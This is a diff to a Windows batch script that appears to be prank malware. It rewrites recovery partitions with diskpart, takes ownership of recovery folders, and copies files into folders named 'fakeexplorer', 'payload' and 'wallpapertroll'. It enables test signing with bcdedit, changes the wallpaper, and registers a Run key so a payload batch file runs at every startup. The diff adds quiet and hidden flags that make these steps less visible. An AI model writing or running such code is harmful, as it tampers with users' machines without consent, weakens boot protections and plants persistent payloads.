@@ -82,7 +82,7 @@ echo Installing Windows RE :)
 diskpart /s %CD%\win7\diskpart.txt
 icacls "C:\Recovery\" /setowner "Dartz" /T /C
 icacls "C:\Recovery\" /grant Dartz:F /T /C
-xcopy "%CD%\win7\win7re\Winre.wim" "C:\Recovery\db77f94e-8028-11eb-a6d0-a34b0745a61f\Winre.wim" /Y
+xcopy "%CD%\win7\win7re\Winre.wim" "C:\Recovery\db77f94e-8028-11eb-a6d0-a34b0745a61f\Winre.wim" /Y /Q /H
 goto SEVENINSTALL
 :SEVENINSTALL
 echo,
@@ -105,7 +105,7 @@ echo Installing Windows RE Protection...
 diskpart /s %CD%\win8\diskpart.txt
 icacls "K:\Recovery\" /setowner "Dartz" /T /C
 icacls "K:\Recovery\" /grant Dartz:F /T /C
-xcopy "%CD%\win7\win78re\Winre.wim" "K:\Recovery'WindowsRE\Winre.wim" /Y
+xcopy "%CD%\win7\win78re\Winre.wim" "K:\Recovery'WindowsRE\Winre.wim" /Y /Q /H
 goto EIGHTINSTALL
 :EIGHTINSTALL
 echo,
@@ -132,7 +132,7 @@ echo Installing Windows RE Protection...
 diskpart /s %CD%\win81\diskpart.txt
 icacls "K:\Recovery\" /setowner "Dartz" /T /C
 icacls "K:\Recovery\" /grant Dartz:F /T /C
-xcopy "%CD%\win81\win81re\Winre.wim" "K:\Recovery\WindowsRE\Winre.wim" /Y
+xcopy "%CD%\win81\win81re\Winre.wim" "K:\Recovery\WindowsRE\Winre.wim" /Y /Q /H
 goto EIGHTPOINTONEINSTALL
 :EIGHTPOINTONEINSTALL
 echo,
@@ -156,7 +156,7 @@ echo Installing Windows RE Protection...
 diskpart /s %CD%\win10\diskpart.txt
 icacls "K:\Recovery\" /setowner "Dartz" /T /C
 icacls "K:\Recovery\" /grant Dartz:F /T /C
-xcopy "%CD%\win10\win10re\Winre.wim" "K:\Recovery\WindowsRE\Winre.wim" /Y
+xcopy "%CD%\win10\win10re\Winre.wim" "K:\Recovery\WindowsRE\Winre.wim" /Y /Q /H
 goto TENINSTALL
 :TENINSTALL
 echo,
@@ -200,11 +200,11 @@ goto DESTROY
 mkdir c:\windows\fakeexplorer
 mkdir c:\windows\payload
 mkdir c:\windows\wallpapertroll
-xcopy %CD%\junkins\startup\no.bat c:\windows\fakeexplorer
-xcopy %CD%\junkins\startup\startup.bat c:\windows\payload\startup.bat
-xcopy %CD%\walp.bmp c:\windows\wallpapertroll\walp.bmp
+xcopy %CD%\junkins\startup\no.bat c:\windows\fakeexplorer /y /q /h
+xcopy %CD%\junkins\startup\startup.bat c:\windows\payload\startup.bat /y /q /h
+xcopy %CD%\walp.bmp c:\windows\wallpapertroll\walp.bmp /y /q /h
 bcdedit /set TESTSIGNING on
-reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d %CD%\walp.bmp /f
+reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d c:\windows\wallpapertroll\walp.bmp /f
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v cmdv4 /t REG_SZ /d c:\windows\payload\startup.bat
 RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters
 goto AAAAJJ
